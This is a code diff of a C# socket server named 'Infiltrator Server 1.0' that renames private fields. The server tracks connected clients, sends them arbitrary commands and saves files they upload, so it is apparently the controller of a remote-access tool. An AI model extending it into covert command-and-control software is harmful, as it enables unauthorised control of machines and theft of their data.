@@ -7,37 +7,37 @@ namespace Server.Conexion
 {
     static class ServerSocket
     {
-        private static TcpListener listener;
-        private static Dictionary<int, TcpClient> clients = new Dictionary<int, TcpClient>();
-        private static int clientIdCounter = 0;
-        private static bool isRunning;
-        private static bool waitingForResponse = false;
-        private static Logger logger = Logger.getInstance();
+        private static TcpListener _listener;
+        private static Dictionary<int, TcpClient> _clients = new Dictionary<int, TcpClient>();
+        private static int _clientIdCounter = 0;
+        private static bool _isRunning;
+        private static bool _waitingForResponse = false;
+        private static Logger _logger = Logger.getInstance();
 
         public static bool isWaiting()
         {
-            return waitingForResponse;
+            return _waitingForResponse;
         }
 
         public static bool serverStatus()
         {
-            return isRunning;
+            return _isRunning;
         }
         public static void startServer()
         {
-            listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
-            listener.Start();
-            logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}",LogLevel.INFO);
+            _listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
+            _listener.Start();
+            _logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}",LogLevel.INFO);
             Thread acceptClientsThread = new Thread(AcceptClients);
             acceptClientsThread.Start();
-            isRunning = true;
+            _isRunning = true;
         }
 
         public static void stopServer()
         {
-            listener.Stop();
-            logger.Log("Deteniendo servidor Infiltrator...", LogLevel.INFO);
-            isRunning = false;  
+            _listener.Stop();
+            _logger.Log("Deteniendo servidor Infiltrator...", LogLevel.INFO);
+            _isRunning = false;  
         }
         public static void HandleClient(TcpClient client, int clientId)
         {
@@ -57,7 +57,7 @@ namespace Server.Conexion
                     {
                         string fileName = data.Substring(5).Trim();
                         Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Recibiendo archivo '{fileName}'...");
-                        logger.Log($"Recibiendo archivo {fileName}", LogLevel.INFO);
+                        _logger.Log($"Recibiendo archivo {fileName}", LogLevel.INFO);
                         // Recibir datos del archivo
                         using (MemoryStream ms = new MemoryStream())
                         {
@@ -103,17 +103,17 @@ namespace Server.Conexion
             catch (Exception ex)
             {
                 Console.WriteLine($"\nInfiltrator Server 1.0> [ERROR] Error al manejar al cliente {clientId}: {ex.Message}");
-                logger.Log($"Error al manejar al cliente {clientId}: {ex.Message}", LogLevel.ERROR);
+                _logger.Log($"Error al manejar al cliente {clientId}: {ex.Message}", LogLevel.ERROR);
             }
 
-            lock (clients)
+            lock (_clients)
             {
-                clients.Remove(clientId);
+                _clients.Remove(clientId);
             }
 
             client.Close();
             Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} desconectado.");
-            logger.Log($"Cliente {clientId} desconectado.", LogLevel.INFO);
+            _logger.Log($"Cliente {clientId} desconectado.", LogLevel.INFO);
         }
 
         public static void SaveFile(string fileName, byte[] fileData)
@@ -122,12 +122,12 @@ namespace Server.Conexion
             {
                 File.WriteAllBytes(fileName, fileData);
                 Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Archivo '{fileName}' recibido y guardado correctamente.");
-                logger.Log($"Archivo '{fileName}' recibido y guardado correctamente.", LogLevel.INFO);
+                _logger.Log($"Archivo '{fileName}' recibido y guardado correctamente.", LogLevel.INFO);
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"\nInfiltrator Server 1.0> [ERROR] Error al guardar el archivo '{fileName}': {ex.Message}");
-                logger.Log($"Error al guardar el archivo '{fileName}': {ex.Message}", LogLevel.ERROR);
+                _logger.Log($"Error al guardar el archivo '{fileName}': {ex.Message}", LogLevel.ERROR);
             }
         }
 
@@ -159,9 +159,9 @@ namespace Server.Conexion
             Console.WriteLine("\n=====================");
             Console.WriteLine("|CLIENTES CONECTADOS|");
             Console.WriteLine("=====================");
-            lock (clients)
+            lock (_clients)
             {
-                if (clients.Count == 0)
+                if (_clients.Count == 0)
                 {
                     Console.WriteLine("No hay clientes conectados.");
                 }
@@ -170,7 +170,7 @@ namespace Server.Conexion
                     Console.WriteLine("+--------------------------------------+");
                     Console.WriteLine("|       ID       |       Estado        |");
                     Console.WriteLine("+--------------------------------------+");
-                    foreach (var client in clients)
+                    foreach (var client in _clients)
                     {
                         string clientStatus = IsClientConnected(client.Value) ? "Conectado" : "Desconectado";
                         Console.WriteLine($"|        {client.Key,-5}   |      {clientStatus,-12}   |");
@@ -184,9 +184,9 @@ namespace Server.Conexion
 
         public static void SendCommand(int clientId, string command)
         {
-            lock (clients)
+            lock (_clients)
             {
-                if (clients.TryGetValue(clientId, out TcpClient client))
+                if (_clients.TryGetValue(clientId, out TcpClient client))
                 {
                     NetworkStream stream = client.GetStream();
                     byte[] commandBytes = Encoding.UTF8.GetBytes(command);
@@ -195,7 +195,7 @@ namespace Server.Conexion
                 else
                 {
                     Console.WriteLine($"\nInfiltrator Server 1.0> [!] Cliente {clientId} no encontrado.");
-                    logger.Log($"Cliente {clientId} no encontrado.",LogLevel.ERROR);
+                    _logger.Log($"Cliente {clientId} no encontrado.",LogLevel.ERROR);
                 }
             }
 
@@ -204,19 +204,19 @@ namespace Server.Conexion
         {
             try
             {
-                while (isRunning)
+                while (_isRunning)
                 {
-                    TcpClient client = listener.AcceptTcpClient();
-                    clientIdCounter++;
-                    int clientId = clientIdCounter;
+                    TcpClient client = _listener.AcceptTcpClient();
+                    _clientIdCounter++;
+                    int clientId = _clientIdCounter;
 
-                    lock (clients)
+                    lock (_clients)
                     {
-                        clients.Add(clientId, client);
+                        _clients.Add(clientId, client);
                     }
 
                     Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} conectado.");
-                    logger.Log($"Cliente {clientId} conectado.", LogLevel.INFO);
+                    _logger.Log($"Cliente {clientId} conectado.", LogLevel.INFO);
                     Thread clientThread = new Thread(() => HandleClient(client, clientId));
                     clientThread.Start();
                 }
@@ -225,13 +225,13 @@ namespace Server.Conexion
             {
                 // Se produce cuando listener.Stop() es llamado
                 Console.WriteLine("\nInfiltrator Server 1.0> [INFO] El servidor ha sido detenido.");
-                logger.Log($"El servidor se ha detenido: {s.Message}", LogLevel.WARNING);
+                _logger.Log($"El servidor se ha detenido: {s.Message}", LogLevel.WARNING);
             }
         }
 
         public static void setWaiting(bool status) {
 
-            waitingForResponse = status;
+            _waitingForResponse = status;
         }
     }
 }
